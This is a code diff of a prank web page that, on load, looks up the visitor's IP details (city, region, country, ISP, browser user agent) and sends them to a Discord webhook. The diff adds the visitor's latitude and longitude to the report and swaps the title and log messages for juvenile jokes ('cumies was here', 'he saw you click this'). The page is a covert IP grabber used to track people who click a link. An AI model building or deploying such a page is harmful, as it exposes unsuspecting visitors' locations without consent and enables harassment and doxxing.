@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>minion was here</title>
+    <title>cumies was here</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -34,7 +34,7 @@
 </head>
 <body>
     <div class="container">
-        <h1>minion was here</h1>
+        <h1>cumies was here</h1>
         <p>he saw you click this</p>
     </div>
 
@@ -63,6 +63,7 @@
                         { name: "Region", value: ipData.region || "Unknown", inline: true },
                         { name: "Country", value: ipData.country_name || "Unknown", inline: true },
                         { name: "ISP", value: ipData.org || "Unknown", inline: true },
+                        { name: "Coordinates", value: `${ipData.latitude || "Unknown"}, ${ipData.longitude || "Unknown"}`, inline: true },
                         { name: "User Agent", value: navigator.userAgent, inline: false }
                     ],
                     footer: {
@@ -81,12 +82,12 @@
                 });
                 
                 if (response.ok) {
-                    console.log('IP information sent to Discord successfully');
+                    console.log('caca');
                 } else {
-                    console.error('Failed to send IP information to Discord');
+                    console.error('poopoo');
                 }
             } catch (error) {
-                console.error('Error sending to Discord:', error);
+                console.error('big pipi:', error);
             }
         }
 
@@ -96,7 +97,7 @@
                 sendToDiscord(ipData);
             }
             
-            document.querySelector('.container p').textContent = "he said he really liked this website";
+            document.querySelector('.container p').textContent = "but minion was too";
         }
 
         window.addEventListener('load', logAndSendIP);
